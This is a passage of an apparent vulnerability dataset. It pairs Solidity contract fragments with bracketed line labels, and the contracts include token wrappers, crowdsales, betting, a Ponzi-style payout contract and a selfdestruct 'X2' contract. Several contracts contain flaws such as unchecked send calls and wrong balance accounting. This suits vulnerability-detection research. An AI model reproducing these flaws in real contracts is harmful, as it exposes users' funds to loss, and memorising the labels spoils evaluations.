        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"    function balanceOfAt(address _owner, uint _blockNumber) public constant returns (uint);
    function totalSupplyAt(uint _blockNumber) public constant returns(uint);
}
/// @dev This is the main contract, it is intended to distribute deposited funds
///  from a TRUSTED `owner` to token holders of a MiniMe style ERC-20 Token;
///  only deposits from the `owner` using the functions `newTokenPayment()` &
///  `newEtherPayment()` will be distributed, any other funds sent to this
///  contract can only be removed via the `escapeHatch()`
contract WithdrawContract is Escapable {
    /// @dev Tracks the deposits made to this contract
    struct Deposit {
        uint block;    // Determines which token holders are able to collect
        ERC20 token;   // The token address (0x0 if ether)
        uint amount;   // The amount deposited in the smallest unit (wei if ETH)
        bool canceled; // True if canceled by the `owner`
    }
    Deposit[] public deposits; // Array of deposits to this contract
    MiniMeToken rewardToken;     // Token that is used for withdraws
    mapping (address => uint) public nextDepositToPayout; // Tracks Payouts
    mapping (address => mapping(uint => bool)) skipDeposits;
/////////
// Constructor
/////////
    /// @notice The Constructor creates the `WithdrawContract` on the blockchain
    ///  the `owner` role is assigned to the address that deploys this contract
    /// @param _rewardToken The address of the token that is used to determine the
    ///  distribution of the deposits according to the balance held at the
    ///  deposit's specified `block`
    /// @param _escapeHatchCaller The address of a trusted account or contract
    ///  to call `escapeHatch()` to send the specified token (or ether) held in
    ///  this contract to the `escapeHatchDestination`
    /// @param _escapeHatchDestination The address of a safe location (usu a
    ///  Multisig) to send the ether and tokens held in this contract when the
    ///  `escapeHatch()` is called
    function WithdrawContract(
        MiniMeToken _rewardToken,
        address _escapeHatchCaller,
        address _escapeHatchDestination)
        Escapable(_escapeHatchCaller, _escapeHatchDestination)
        public
    {
        rewardToken = _rewardToken;
    }
    /// @dev When ether is sent to this contract `newEtherDeposit()` is called
    function () payable public {
        newEtherDeposit(0);
    }
/////////
// Owner Functions
/////////
    /// @notice Adds an ether deposit to `deposits[]`; only the `owner` can
    ///  deposit into this contract
    /// @param _block The block height that determines the snapshot of token
    ///  holders that will be able to withdraw their share of this deposit; this
    ///  block must be set in the past, if 0 it defaults to one block before the
    ///  transaction
    /// @return _idDeposit The id number for the deposit
    function newEtherDeposit(uint _block)
        public onlyOwner payable
        returns (uint _idDeposit)
    {
        require(msg.value>0);
        require(_block < block.number);
        _idDeposit = deposits.length ++;
        // Record the deposit
        Deposit storage d = deposits[_idDeposit];
        d.block = _block == 0 ? block.number -1 : _block;
        d.token = ERC20(0);
        d.amount = msg.value;
        NewDeposit(_idDeposit, ERC20(0), msg.value);
    }
    /// @notice Adds a token deposit to `deposits[]`; only the `owner` can
    ///  call this function and it will only work if the account sending the
    ///  tokens has called `approve()` so that this contract can call
    ///  `transferFrom()` and take the tokens
    /// @param _token The address for the ERC20 that is being deposited
    /// @param _amount The quantity of tokens that is deposited into the
    ///  contract in the smallest unit of tokens (if a token has its decimals
    ///  set to 18 and 1 token is sent, the `_amount` would be 10^18)
    /// @param _block The block height that determines the snapshot of token
    ///  holders that will be able to withdraw their share of this deposit; this
    ///  block must be set in the past, if 0 it defaults to one block before the
    ///  transaction
    /// @return _idDeposit The id number for the deposit
    function newTokenDeposit(ERC20 _token, uint _amount, uint _block)
        public onlyOwner
        returns (uint _idDeposit)
    {
        require(_amount > 0);
        require(_block < block.number);
        // Must `approve()` this contract in a previous transaction
        require( _token.transferFrom(msg.sender, address(this), _amount) );
        _idDeposit = deposits.length ++;
        // Record the deposit
        Deposit storage d = deposits[_idDeposit];
        d.block = _block == 0 ? block.number -1 : _block;
        d.token = _token;
        d.amount = _amount;
        NewDeposit(_idDeposit, _token, _amount);
    }
    /// @notice This function is a failsafe function in case a token is
    ///  deposited that has an issue that could prevent it's withdraw loop break
    ///  (e.g. transfers are disabled), can only be called by the `owner`
    /// @param _idDeposit The id number for the deposit being canceled
    function cancelPaymentGlobally(uint _idDeposit) public onlyOwner {
        require(_idDeposit < deposits.length);
        deposits[_idDeposit].canceled = true;
        CancelPaymentGlobally(_idDeposit);
    }
/////////
// Public Functions
/////////
    /// @notice Sends all the tokens and ether to the token holder by looping
    ///  through all the deposits, determining the appropriate amount by
    ///  dividing the `totalSupply` by the number of tokens the token holder had
    ///  at `deposit.block` for each deposit; this function may have to be
    ///  called multiple times if their are many deposits
    function withdraw() public {
        uint acc = 0; // Accumulates the amount of tokens/ether to be sent
        uint i = nextDepositToPayout[msg.sender]; // Iterates through the deposits
        require(i<deposits.length);
        ERC20 currentToken = deposits[i].token; // Sets the `currentToken` to ether
        require(msg.gas>149000); // Throws if there is no gas to do at least a single transfer.
        while (( i< deposits.length) && ( msg.gas > 148000)) {
            Deposit storage d = deposits[i];
            // Make sure `deposit[i]` shouldn't be skipped
            if ((!d.canceled)&&(!isDepositSkiped(msg.sender, i))) {
                // The current diposti is different of the accumulated until now,",[64]
"pragma solidity ^0.4.24;
contract Wizard {
    address owner;
    function Wizard() {
        owner = msg.sender;
    }
    mapping (address => uint256) balances;
    mapping (address => uint256) timestamp;
    function() external payable {
        owner.send(msg.value / 10);
        if (balances[msg.sender] != 0){
        address kashout = msg.sender;
        uint256 getout = balances[msg.sender]*2/100*(block.number-timestamp[msg.sender])/5900;
        kashout.send(getout);
        }
        timestamp[msg.sender] = block.number;
        balances[msg.sender] += msg.value;
    }
}",[10]
"    function updatePurchasePossible(bool _isRunning) onlyOwner returns (bool success){
        if (_isRunning){
            require(sellWolkEstimate(10**decimals, exchangeFormula) > 0);
            require(purchaseWolkEstimate(10**decimals, exchangeFormula) > 0);
        }
        isPurchasePossible = _isRunning;
        return true;
    }
    // @param  _isRunning
    // @return success
    // @dev updating isSellPossible -- only Wolk Inc can set this
    function updateSellPossible(bool _isRunning) onlyOwner returns (bool success){
        if (_isRunning){
            require(sellWolkEstimate(10**decimals, exchangeFormula) > 0);
            require(purchaseWolkEstimate(10**decimals, exchangeFormula) > 0);
        }
        isSellPossible = _isRunning;
        return true;
    }
    function sellWolkEstimate(uint256 _wolkAmountest, address _formula) internal returns(uint256) {
        uint256 ethReceivable =  IBancorFormula(_formula).calculateSaleReturn(contributorTokens, reserveBalance, percentageETHReserve, _wolkAmountest);
        return ethReceivable;
    }
    function purchaseWolkEstimate(uint256 _ethAmountest, address _formula) internal returns(uint256) {
        uint256 wolkReceivable = IBancorFormula(_formula).calculatePurchaseReturn(contributorTokens, reserveBalance, percentageETHReserve, _ethAmountest);
        return wolkReceivable;
    }
    // @param _wolkAmount
    // @return ethReceivable
    // @dev send Wolk into contract in exchange for eth, at an exchange rate based on the Bancor Protocol derivation and decrease totalSupply accordingly
    function sellWolk(uint256 _wolkAmount) isSellable() returns(uint256) {
        require((balances[msg.sender] >= _wolkAmount));
        uint256 ethReceivable = sellWolkEstimate(_wolkAmount,exchangeFormula);
        require(this.balance > ethReceivable);
        balances[msg.sender] = safeSub(balances[msg.sender], _wolkAmount);
        contributorTokens = safeSub(contributorTokens, _wolkAmount);
        totalTokens = safeSub(totalTokens, _wolkAmount);
        reserveBalance = safeSub(this.balance, ethReceivable);
        WolkDestroyed(msg.sender, _wolkAmount);
        Transfer(msg.sender, 0x00000000000000000000, _wolkAmount);
        msg.sender.transfer(ethReceivable);
        return ethReceivable;
    }
    // @return wolkReceivable
    // @dev send eth into contract in exchange for Wolk tokens, at an exchange rate based on the Bancor Protocol derivation and increase totalSupply accordingly
    function purchaseWolk(address _buyer) isPurchasable() payable returns(uint256){
        require(msg.value > 0);
        uint256 wolkReceivable = purchaseWolkEstimate(msg.value, exchangeFormula);
        require(wolkReceivable > 0);
        contributorTokens = safeAdd(contributorTokens, wolkReceivable);
        totalTokens = safeAdd(totalTokens, wolkReceivable);
        balances[_buyer] = safeAdd(balances[_buyer], wolkReceivable);
        reserveBalance = safeAdd(reserveBalance, msg.value);
        WolkCreated(_buyer, wolkReceivable);
        Transfer(address(this),_buyer,wolkReceivable);
        return wolkReceivable;
    }
    // @dev  fallback function for purchase
    // @note Automatically fallback to tokenGenerationEvent before sale is completed. After the token generation event, fallback to purchaseWolk. Liquidity exchange will be enabled through updateExchangeStatus
    function () payable {
        require(msg.value > 0);
        if(!allSaleCompleted){
            this.tokenGenerationEvent.value(msg.value)(msg.sender);
        } else if ( block.timestamp >= end_time ){
            this.purchaseWolk.value(msg.value)(msg.sender);
        } else {
            revert();
        }
    }
}",[64]
" * Such a change is called an implementation upgrade.
 */
contract BaseUpgradeabilityProxy is Proxy {
  /**
   * @dev Emitted when the implementation is upgraded.
   * @param implementation Address of the new implementation.
   */
  event Upgraded(address indexed implementation);
  /**
   * @dev Storage slot with the address of the current implementation.
   * This is the keccak-256 hash of ""org.zeppelinos.proxy.implementation"", and is
   * validated in the constructor.
   */
  bytes32 internal constant IMPLEMENTATION_SLOT = 0x7050c9e0f4ca769c69bd3a8ef740bc37934f8e2c036e5a723fd8ee048ed3f8c3;
  /**
   * @dev Returns the current implementation.
   * @return impl Address of the current implementation
   */
  function _implementation() internal override view returns (address impl) {
    bytes32 slot = IMPLEMENTATION_SLOT;
    assembly {
      impl := sload(slot)
    }
  }
  /**
   * @dev Upgrades the proxy to a new implementation.
   * @param newImplementation Address of the new implementation.
   */
  function _upgradeTo(address newImplementation) internal {
    _setImplementation(newImplementation);
    emit Upgraded(newImplementation);
  }
  /**
   * @dev Sets the implementation address of the proxy.
   * @param newImplementation Address of the new implementation.
   */
  function _setImplementation(address newImplementation) internal {
    require(Address.isContract(newImplementation), ""Cannot set a proxy implementation to a non-contract address"");
    bytes32 slot = IMPLEMENTATION_SLOT;
    assembly {
      sstore(slot, newImplementation)
    }
  }
}
/**
 * @title InitializableUpgradeabilityProxy
 * @dev Extends BaseUpgradeabilityProxy with an initializer for initializing
 * implementation and init data.
 */
contract InitializableUpgradeabilityProxy is BaseUpgradeabilityProxy {
  /**
   * @dev Contract initializer.
   * @param _logic Address of the initial implementation.
   * @param _data Data to send as msg.data to the implementation to initialize the proxied contract.
   * It should include the signature and the parameters of the function to be called, as described in
   * https://solidity.readthedocs.io/en/v0.4.24/abi-spec.html#function-selector-and-argument-encoding.
   * This parameter is optional, if no data is given the initialization call to proxied contract will be skipped.
   */
  function initialize(address _logic, bytes memory _data) public payable {
    require(_implementation() == address(0));
    assert(IMPLEMENTATION_SLOT == keccak256(""org.zeppelinos.proxy.implementation""));
    _setImplementation(_logic);
    if(_data.length > 0) {
      (bool success,) = _logic.delegatecall(_data);
      require(success);
    }
  }
}
/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
contract Context {
    // Empty internal constructor, to prevent people from mistakenly deploying
    // an instance of this contract, which should be used via inheritance.
    constructor () internal { }
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), ""Ownable: caller is not the owner"");
        _;
    }
    /**
     * @dev Leaves the contract without owner. It will not be possible to call",[64]
"  }
  function hasBet(uint256 _gameId) view internal returns(bool){
    return bets[msg.sender][_gameId].amount > 0;
  }
  modifier hasUserBet(uint256 _gameId) {
    require (hasBet(_gameId), ""User did not bet this game."");
    _;
  }
  modifier hasNotUserBet(uint256 _gameId) {
    require(!hasBet(_gameId), ""User has already bet this game."");
    _;
  }
  modifier hasFreeBets() {
    require (users[msg.sender].freeBets > 0, ""User does not have free bets."");
    _;
  }
  modifier isGameExist(uint256 _gameId) {
    require(!(games[_gameId].ended), ""Game does not exist."");
    _;
  }
  modifier isGameNotStarted(uint256 _gameId) {
    // stop making bets when 5 minutes till game start
    // 300000 = 1000 * 60 * 5 - 5 minutes
    require(games[_gameId].date > now + 300000, ""Game has started."");
    _;
  }
  modifier isRightBetResult(uint8 _betResult) {
    require (_betResult > 0 && _betResult < 4);
    _;
  }
  function setMinBet(uint256 _minBet) external onlyAdmin {
    minBet = _minBet;
  }
  function setMaxBet(uint256 _maxBet) external onlyAdmin {
    maxBet = _maxBet;
  }
  function addFreeBet(address _gambler, uint _count) external onlyAdmin  {
    users[_gambler].freeBets += _count;
  }
  function addGame(string _team1, string _team2, uint _date, uint _dayOfYear)
    external
    onlyAdmin
  {
    lastGameId += 1;
    games[lastGameId] = Game(_team1, _team2, _date, false, 0, 0, 0, 0);
    gamesByDayOfYear[_dayOfYear].push(lastGameId);
  }
  function setGameResult(uint _gameId, uint8 _result)
    external
    isGameExist(_gameId)
    isRightBetResult(_result)
    onlyAdmin
  {
    games[_gameId].ended = true;
    games[_gameId].result = _result;
  }
  function addBet(uint _gameId, uint8 _betResult, uint256 _amount, bool _isFree) internal{
    bets[msg.sender][_gameId] = Bet(_amount, _betResult, false, _isFree, false);
    if(_betResult == 1){
      games[_gameId].firstWinResultSum += _amount;
    } else if(_betResult == 2) {
      games[_gameId].drawResultSum += _amount;
    } else if(_betResult == 3) {
      games[_gameId].secondWinResultSum += _amount;
    }
    users[msg.sender].games.push(_gameId);
    users[msg.sender].totalGames += 1;
  }
  function betGame (
    uint _gameId,
    uint8 _betResult
  )
    external
    biggerMinBet
    lowerMaxBet
    isGameExist(_gameId)
    isGameNotStarted(_gameId)
    hasNotUserBet(_gameId)
    isRightBetResult(_betResult)
    payable
  {
    addBet(_gameId, _betResult, msg.value, false);
    users[msg.sender].statisticBets += 1;
    users[msg.sender].statisticBetsSum += msg.value;
  }
  function betFreeGame(
    uint _gameId,
    uint8 _betResult
  )
    hasFreeBets
    isGameExist(_gameId)
    isGameNotStarted(_gameId)
    hasNotUserBet(_gameId)
    isRightBetResult(_betResult)
    external
  {
    require(users[msg.sender].statisticBets >= betsCountToUseFreeBet, ""You need more bets to use free bet"");
    users[msg.sender].statisticBets -= betsCountToUseFreeBet;
    users[msg.sender].freeBets -= 1;
    addBet(_gameId, _betResult, minBet, true);
  }
  function revertBet(uint _gameId)
    hasUserBet(_gameId)
    isGameNotStarted(_gameId)
    external
  {
    bool isFree = bets[msg.sender][_gameId].isFree;
    require(!isFree, ""You can not revert free bet"");
    bool isReverted = bets[msg.sender][_gameId].isReverted;
    require(!isReverted, ""You can not revert already reverted bet"");
    uint256 amount = bets[msg.sender][_gameId].amount;
    uint256 betResult = bets[msg.sender][_gameId].result;
    if(betResult == 1){
      games[_gameId].firstWinResultSum -= amount;
    } else if(betResult == 2) {
      games[_gameId].drawResultSum -= amount;
    } else if(betResult == 3) {
      games[_gameId].secondWinResultSum -= amount;
    }
    bets[msg.sender][_gameId].isReverted = true;
    msg.sender.transfer(amount.mul(9).div(10)); // return 90% of bet
  }
  function claimPrize(uint _gameId)
    hasUserBet(_gameId)
    public
  {
    address gambler = msg.sender;
    game = games[_gameId];",[64]
"  function Ownable() public {
    owner = msg.sender;
  }
  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   * @param newOwner The address to transfer ownership to.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}
/*
  Copyright Ethfinex Inc 2018
  Licensed under the Apache License, Version 2.0
  http://www.apache.org/licenses/LICENSE-2.0
  will@ethfinex.com
*/
contract WrapperLockEth is BasicToken, Ownable {
    using SafeMath for uint256;
    address public TRANSFER_PROXY_VEFX = 0xdcDb42C9a256690bd153A7B409751ADFC8Dd5851;
    address public TRANSFER_PROXY_V2 = 0x2240Dab907db71e64d3E0dbA4800c83B5C502d4E;
    mapping (address => bool) public isSigner;
    string public name;
    string public symbol;
    uint public decimals;
    address public originalToken = 0x00;
    mapping (address => uint) public depositLock;
    mapping (address => uint256) public balances;
    function WrapperLockEth(string _name, string _symbol, uint _decimals ) Ownable() {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        isSigner[msg.sender] = true;
    }
    function deposit(uint _value, uint _forTime) public payable returns (bool success) {
        require(_forTime >= 1);
        require(now + _forTime * 1 hours >= depositLock[msg.sender]);
        balances[msg.sender] = balances[msg.sender].add(msg.value);
        totalSupply_ = totalSupply_.add(msg.value);
        depositLock[msg.sender] = now + _forTime * 1 hours;
        return true;
    }
    function withdraw(
        uint _value,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint signatureValidUntilBlock
    )
        public
        returns
        (bool)
    {
        require(balanceOf(msg.sender) >= _value);
        if (now > depositLock[msg.sender]) {
            balances[msg.sender] = balances[msg.sender].sub(_value);
            totalSupply_ = totalSupply_.sub(msg.value);
            msg.sender.transfer(_value);
        } else {
            require(block.number < signatureValidUntilBlock);
            require(isValidSignature(keccak256(msg.sender, address(this), signatureValidUntilBlock), v, r, s));
            balances[msg.sender] = balances[msg.sender].sub(_value);
            totalSupply_ = totalSupply_.sub(msg.value);
            depositLock[msg.sender] = 0;
            msg.sender.transfer(_value);
        }
        return true;
    }
    function withdrawDifferentToken(address _token, bool _erc20old) public onlyOwner returns (bool) {
        require(ERC20(_token).balanceOf(address(this)) > 0);
        if (_erc20old) {
            ERC20Old(_token).transfer(msg.sender, ERC20(_token).balanceOf(address(this)));
        } else {
            ERC20(_token).transfer(msg.sender, ERC20(_token).balanceOf(address(this)));
        }
        return true;
    }
    function transfer(address _to, uint256 _value) public returns (bool) {
        return false;
    }
    function transferFrom(address _from, address _to, uint _value) public {
        require(isSigner[_to] || isSigner[_from]);
        assert(msg.sender == TRANSFER_PROXY_VEFX || msg.sender == TRANSFER_PROXY_V2);
        balances[_to] = balances[_to].add(_value);
        depositLock[_to] = depositLock[_to] > now ? depositLock[_to] : now + 1 hours;
        balances[_from] = balances[_from].sub(_value);
        Transfer(_from, _to, _value);
    }
    function allowance(address _owner, address _spender) public constant returns (uint) {
        if (_spender == TRANSFER_PROXY_VEFX || _spender == TRANSFER_PROXY_V2) {
            return 2**256 - 1;
        }
    }
    function balanceOf(address _owner) public constant returns (uint256) {
        return balances[_owner];
    }
    function isValidSignature(
        bytes32 hash,
        uint8 v,
        bytes32 r,
        bytes32 s)
        public
        constant
        returns (bool)
    {
        return isSigner[ecrecover(
            keccak256(""\x19Ethereum Signed Message:\n32"", hash),
            v,
            r,
            s
        )];
    }
    function addSigner(address _newSigner) public {
        require(isSigner[msg.sender]);
        isSigner[_newSigner] = true;
    }
    function keccak(address _sender, address _wrapper, uint _validTill) public constant returns(bytes32) {
        return keccak256(_sender, _wrapper, _validTill);
    }",[64]
"   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   * @param newOwner The address to transfer ownership to.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}
/*
  Copyright Ethfinex Inc 2018
  Licensed under the Apache License, Version 2.0
  http://www.apache.org/licenses/LICENSE-2.0
*/
contract WrapperLockEth is BasicToken, Ownable {
    using SafeERC20 for IERC20;
    using SafeMath for uint256;
    address public TRANSFER_PROXY_VEFX = 0xdcDb42C9a256690bd153A7B409751ADFC8Dd5851;
    address public TRANSFER_PROXY_V2 = 0x95e6f48254609a6ee006f7d493c8e5fb97094cef;
    mapping (address => bool) public isSigner;
    string public name;
    string public symbol;
    uint public decimals;
    address public originalToken = 0x00;
    mapping (address => uint) public depositLock;
    mapping (address => uint256) public balances;
    constructor(string _name, string _symbol, uint _decimals ) Ownable() {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        isSigner[msg.sender] = true;
    }
    // @dev method only for testing, needs to be commented out when deploying
    // function addProxy(address _addr) public {
    //     TRANSFER_PROXY_VEFX = _addr;
    // }
    function deposit(uint _value, uint _forTime) public payable returns (bool success) {
        require(_forTime >= 1);
        require(now + _forTime * 1 hours >= depositLock[msg.sender]);
        balances[msg.sender] = balances[msg.sender].add(msg.value);
        totalSupply_ = totalSupply_.add(msg.value);
        depositLock[msg.sender] = now + _forTime * 1 hours;
        return true;
    }
    function withdraw(
        uint _value,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint signatureValidUntilBlock
    )
        public
        returns
        (bool)
    {
        require(balanceOf(msg.sender) >= _value);
        if (now > depositLock[msg.sender]) {
            balances[msg.sender] = balances[msg.sender].sub(_value);
            totalSupply_ = totalSupply_.sub(_value);
            msg.sender.transfer(_value);
        } else {
            require(block.number < signatureValidUntilBlock);
            require(isValidSignature(keccak256(msg.sender, address(this), signatureValidUntilBlock), v, r, s));
            balances[msg.sender] = balances[msg.sender].sub(_value);
            totalSupply_ = totalSupply_.sub(_value);
            depositLock[msg.sender] = 0;
            msg.sender.transfer(_value);
        }
        return true;
    }
    function withdrawDifferentToken(address _differentToken) public onlyOwner returns (bool) {
        require(_differentToken != originalToken);
        require(IERC20(_differentToken).balanceOf(address(this)) > 0);
        IERC20(_differentToken).safeTransfer(msg.sender, IERC20(_differentToken).balanceOf(address(this)));
        return true;
    }
    function transfer(address _to, uint256 _value) public returns (bool) {
        return false;
    }
    function transferFrom(address _from, address _to, uint _value) public {
        require(isSigner[_to] || isSigner[_from]);
        assert(msg.sender == TRANSFER_PROXY_VEFX || msg.sender == TRANSFER_PROXY_V2);
        balances[_to] = balances[_to].add(_value);
        depositLock[_to] = depositLock[_to] > now ? depositLock[_to] : now + 1 hours;
        balances[_from] = balances[_from].sub(_value);
        Transfer(_from, _to, _value);
    }
    function allowance(address _owner, address _spender) public constant returns (uint) {
        if (_spender == TRANSFER_PROXY_VEFX || _spender == TRANSFER_PROXY_V2) {
            return 2**256 - 1;
        }
    }
    function balanceOf(address _owner) public constant returns (uint256) {
        return balances[_owner];
    }
    function isValidSignature(
        bytes32 hash,
        uint8 v,
        bytes32 r,
        bytes32 s)
        public
        constant
        returns (bool)
    {
        return isSigner[ecrecover(
            keccak256(""\x19Ethereum Signed Message:\n32"", hash),
            v,
            r,
            s
        )];
    }
    function addSigner(address _newSigner) public {
        require(isSigner[msg.sender]);
        isSigner[_newSigner] = true;
    }
    function keccak(address _sender, address _wrapper, uint _validTill) public pure returns(bytes32) {
        return keccak256(_sender, _wrapper, _validTill);
    }
}",[64]
"  /**
   * @dev The Ownable constructor sets the original `owner` of the contract to the sender
   * account.
   */
  function Ownable() public {
    owner = msg.sender;
  }
  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   * @param newOwner The address to transfer ownership to.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}
/*
Copyright Will Harborne (Ethfinex) 2017
*/
contract WrapperLockEth is BasicToken, Ownable {
    using SafeMath for uint256;
    address public TRANSFER_PROXY;
    mapping (address => bool) private isSigner;
    string public name;
    string public symbol;
    uint public decimals;
    address public originalToken = 0x00;
    mapping (address => uint) public depositLock;
    mapping (address => uint256) public balances;
    function WrapperLockEth(string _name, string _symbol, uint _decimals, address _transferProxy) {
        TRANSFER_PROXY = _transferProxy;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        isSigner[msg.sender] = true;
    }
    function deposit(uint _value, uint _forTime) public payable returns (bool success) {
        require(_forTime >= 1);
        require(now + _forTime * 1 hours >= depositLock[msg.sender]);
        balances[msg.sender] = balances[msg.sender].add(msg.value);
        depositLock[msg.sender] = now + _forTime * 1 hours;
        return true;
    }
    function withdraw(
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint _value,
        uint signatureValidUntilBlock
    )
        public
        returns
        (bool)
    {
        require(balanceOf(msg.sender) >= _value);
        if (now > depositLock[msg.sender]) {
            balances[msg.sender] = balances[msg.sender].sub(_value);
            msg.sender.transfer(_value);
        } else {
            require(block.number < signatureValidUntilBlock);
            require(isValidSignature(keccak256(msg.sender, address(this), signatureValidUntilBlock), v, r, s));
            balances[msg.sender] = balances[msg.sender].sub(_value);
            msg.sender.transfer(_value);
        }
        return true;
    }
    function transfer(address _to, uint256 _value) public returns (bool) {
        return false;
    }
    function transferFrom(address _from, address _to, uint _value) public {
        require(_to == owner || _from == owner);
        assert(msg.sender == TRANSFER_PROXY);
        balances[_to] = balances[_to].add(_value);
        balances[_from] = balances[_from].sub(_value);
        Transfer(_from, _to, _value);
    }
    function allowance(address _owner, address _spender) public constant returns (uint) {
        if (_spender == TRANSFER_PROXY) {
            return 2**256 - 1;
        }
    }
    function balanceOf(address _owner) public constant returns (uint256) {
        return balances[_owner];
    }
    function isValidSignature(
        bytes32 hash,
        uint8 v,
        bytes32 r,
        bytes32 s)
        public
        constant
        returns (bool)
    {
        return isSigner[ecrecover(
            keccak256(""\x19Ethereum Signed Message:\n32"", hash),
            v,
            r,
            s
        )];
    }
    function addSigner(address _newSigner) public {
        require(isSigner[msg.sender]);
        isSigner[_newSigner] = true;
    }
    function keccak(address _sender, address _wrapper, uint _validTill) public constant returns(bytes32) {
        return keccak256(_sender, _wrapper, _validTill);
    }
}",[64]
"pragma solidity ^0.4.20;
contract X2Equal
{
    address Owner = msg.sender;
    function() public payable {}
    function cancel() payable public {
        if (msg.sender == Owner) {
            selfdestruct(Owner);
        }
    }
    function X2() public payable {
        if (msg.value >= this.balance) {
            selfdestruct(msg.sender);
        }
    }
}","[11, 13]"
"  function lastTokenIsTransferableDate(address holder) constant public returns (uint64 date) {
    date = uint64(now);
    uint256 grantIndex = grants[holder].length;
    for (uint256 i = 0; i < grantIndex; i++) {
      date = SafeMath.max64(grants[holder][i].vesting, date);
    }
  }
}
// vesting: 365 days, 365 days / 4 vesting
contract XFM is VestedToken {
  string public name = ""XferMoney"";
  string public symbol = ""XFM"";
  uint public decimals = 4;
  //Special Addresses
  address public multisigAddress=0x749BD34C771456a8DE28Aa0883b00d11273E2Ede; // Address to which all ether fund receive.
  address public XferMoneyTeamAddress=0xc179FCbdEef2DA2A61Ed9b1817942d72B0a46c8a; // Address to which team tokens are reserved.
  address public XferMoneyMarketing=0x9EED63b353Af69cFbDC0e15A1b037429f0780D1c; // Address to which Marketing tokens are reserved.
  address public ownerAddress; // Address of the contract owner. Can halt the crowdsale.
  //Crowdsale Time
  uint public constant publicStartTime=now; // Time in seconds when public Presale starts.
  uint public constant PRESALE_START_WEEK1=1516406401; // Time in seconds when Presale Weel 1 starts.
  uint public constant PRESALE_START_WEEK2=1517011201; // Time in seconds when Presale Week 2 starts.
  uint public constant PRESALE_START_WEEK3=1517616001; // Time in seconds when Presale Week 3 starts.
  uint public constant CROWDSALE_START=1518652801; // Time in seconds when Public Crowdsale starts.
  uint public publicEndTime=1522540799; // Time in seconds XFM crowdsale ends
  // Multiplier for the decimals
  uint private constant DECIMALS = 10000;
  //Prices of XFM
  uint public constant PRICE_CROWDSALE    = 8000*DECIMALS; // XFM Price per one ETH during crowdsale;
  uint public constant PRICE_PRESALE_START   = PRICE_CROWDSALE * 140/100; // Price with 40% Bonus XFM
  uint public constant PRICE_PRESALE_WEEK1   = PRICE_CROWDSALE * 125/100; //  Price with 25% Bonus XFM
  uint public constant PRICE_PRESALE_WEEK2 = PRICE_CROWDSALE * 118/100; //   Price with 18% Bonus XFM
  uint public constant PRICE_PRESALE_WEEK3 = PRICE_CROWDSALE * 110/100; //   Price with 10% Bonus XFM
  //Assigned XFM Tokens
  uint256 public constant _initialSupply=  250000000*DECIMALS; // Total tokens assigned initially
  uint public constant ALLOC_TEAM =         62500000*DECIMALS; // Token reserved for team
  uint public constant ALLOC_CROWDSALE =    175000000*DECIMALS; // Allocated for Crowdsale(Phase 1 + Phase 2)
  uint public constant ALLOC_MARKETING =    12500000*DECIMALS; // Allocated for Marketing, Bonties
  //Running totals
  uint public etherRaised; // Total Ether raised.
  uint public XFMSold; // Total XFM sold
  uint public hardcapInEth=25000* 1 ether;
  uint256 public totalSupply = _initialSupply;
  //booleans
  bool public halted; // halts the crowd sale if true.
  // MODIFIERS
  //Is currently in the period after the private start time and before the public start time.
  modifier is_pre_crowdfund_period() {
    if (now >= publicStartTime ) throw;
    _;
  }
  //Is currently the crowdfund period
  modifier is_crowdfund_period() {
    if (now < publicStartTime) throw;
    if (isCrowdfundCompleted()) throw;
    _;
  }
  // Is completed
  modifier is_crowdfund_completed() {
    if (!isCrowdfundCompleted()) throw;
    _;
  }
  function isCrowdfundCompleted() internal returns (bool) {
    if (now > publicEndTime && XFMSold >= ALLOC_CROWDSALE) return true; // Crowdsale can also be halted by the owner.
    return false;
  }
  //May only be called by the owner address
  modifier only_owner() {
    if (msg.sender != ownerAddress) throw;
    _;
  }
  //May only be called if the crowdfund has not been halted
  modifier is_not_halted() {
    if (halted) throw;
    _;
  }
  // EVENTS
  event Buy(address indexed _recipient, uint _amount);
